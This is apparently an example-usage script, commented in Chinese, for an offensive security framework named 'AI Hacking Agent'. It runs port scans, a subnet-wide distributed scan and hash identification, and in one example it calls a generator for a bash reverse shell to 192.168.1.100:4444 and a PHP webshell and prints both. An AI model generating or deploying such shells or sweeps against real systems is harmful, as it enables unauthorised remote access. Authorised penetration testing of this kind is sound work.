#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
basic_usage模块，提供相关安全测试功能。

模块功能：
    - 提供相关安全测试功能
    - 支持API调用和命令行使用
    - 与其他模块集成协作

注意事项：
    - 本模块仅用于授权的安全测试
    - 请勿用于非法用途
    - 使用前请确保已获得相关授权
"""
import sys
import os

# 添加项目根目录
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))


def example_basic_scan():
    """示例1：基础端口扫描"""
    print("=" * 60)
    print("示例1：基础端口扫描")
    print("=" * 60)

    from tools.network_scanners import nmap_advanced

    # 执行快速扫描
    result = nmap_advanced.quick_scan("127.0.0.1")

    print(f"目标: {result.host}")
    print(f"扫描时间: {result.scan_time}")
    print(f"开放端口: {len(result.open_ports)}个")
    for port in result.open_ports[:5]:
        print(f"  - {port.port}/{port.protocol} {port.service} {port.version}")
    print()


def example_payload_generation():
    """示例2：Payload生成"""
    print("=" * 60)
    print("示例2：Payload生成")
    print("=" * 60)

    from exploit.payload_generator import payload_generator

    # 生成Bash反向Shell
    payload = payload_generator.generate_reverse_shell(
        host="192.168.1.100",
        port=4444,
        language="bash",
        target_os="linux",
    )

    print(f"类型: {payload.payload_type.value}")
    print(f"语言: {payload.language}")
    print(f"目标系统: {payload.target_os}")
    print(f"Payload内容:")
    print(payload.content)
    print()

    # 生成PHP WebShell
    webshell = payload_generator.generate_webshell(
        language="php",
        password="cmd",
    )
    print(f"WebShell ({webshell.language}):")
    print(webshell.content[:200] + "...")
    print()


def example_hash_identification():
    """示例3：哈希类型识别"""
    print("=" * 60)
    print("示例3：哈希类型识别")
    print("=" * 60)

    from tools.password_attacks import hash_identifier

    # 识别MD5哈希
    md5_hash = "5f4dcc3b5aa765d61d8327deb882cf99"
    results = hash_identifier.identify(md5_hash)

    print(f"哈希: {md5_hash}")
    print(f"可能的类型:")
    for r in results[:5]:
        print(f"  - {r['type']} (置信度: {r.get('confidence', 'N/A')})")
    print()


def example_tool_management():
    """示例4：工具管理器"""
    print("=" * 60)
    print("示例4：工具管理器")
    print("=" * 60)

    from tools.tool_manager import tool_manager

    # 列出所有工具
    tools = tool_manager.list_tools()
    print(f"已注册工具: {len(tools)}个")

    # 按分类统计
    categories = tool_manager.list_categories()
    print(f"工具分类: {len(categories)}个")
    for cat in categories:
        cat_tools = tool_manager.list_tools(category=cat)
        print(f"  - {cat}: {len(cat_tools)}个工具")

    # 搜索工具
    print()
    results = tool_manager.search_tools("nmap")
    print(f"搜索'nmap'结果: {len(results)}个")
    for tool in results[:3]:
        print(f"  - {tool.name}: {tool.description}")
    print()


def example_distributed_scanning():
    """示例5：分布式扫描"""
    print("=" * 60)
    print("示例5：分布式扫描")
    print("=" * 60)

    from distributed.scheduler import distributed_scheduler

    # 提交扫描任务
    task_id = distributed_scheduler.submit_task(
        task_type="port_scan",
        payload={"target": "192.168.1.0/24", "ports": "1-1000"},
        priority=5,
    )

    print(f"任务已提交: {task_id}")
    print(f"任务类型: port_scan")
    print(f"目标: 192.168.1.0/24")
    print(f"优先级: 5")
    print()

    # 查看任务状态
    task = distributed_scheduler.tasks.get(task_id)
    if task:
        print(f"任务状态: {task.status.value}")
        print(f"创建时间: {task.created_at}")
    print()


def example_vulnerability_database():
    """示例6：漏洞数据库"""
    print("=" * 60)
    print("示例6：漏洞数据库")
    print("=" * 60)

    try:
        from knowledge.cve_database import cve_database

        # 获取统计信息
        stats = cve_database.get_statistics()
        print(f"漏洞总数: {stats.get('total', 0)}")
        print(f"严重漏洞: {stats.get('critical', 0)}")
        print(f"高危漏洞: {stats.get('high', 0)}")
        print(f"中危漏洞: {stats.get('medium', 0)}")
        print(f"低危漏洞: {stats.get('low', 0)}")
    except Exception as e:
        print(f"漏洞数据库示例: {e}")
    print()


def main():
    """运行所有示例"""
    print()
    print("╔" + "=" * 58 + "╗")
    print("║" + " " * 15 + "AI Hacking Agent 示例" + " " * 20 + "║")
    print("╚" + "=" * 58 + "╝")
    print()

    examples = [
        ("基础端口扫描", example_basic_scan),
        ("Payload生成", example_payload_generation),
        ("哈希类型识别", example_hash_identification),
        ("工具管理器", example_tool_management),
        ("分布式扫描", example_distributed_scanning),
        ("漏洞数据库", example_vulnerability_database),
    ]

    for name, func in examples:
        try:
            func()
        except Exception as e:
            print(f"[错误] {name}: {e}")
            import traceback
            traceback.print_exc()
        print()

    print("=" * 60)
    print("所有示例运行完成！")
    print("=" * 60)
    print()
    print("更多示例请查看:")
    print("  - examples/api_client.py      API客户端示例")
    print("  - examples/scan_workflow.py   扫描工作流示例")
    print("  - examples/penetration_test.py 完整渗透测试示例")
    print("  - examples/custom_agent.py     自定义智能体示例")
    print()


if __name__ == "__main__":
    main()
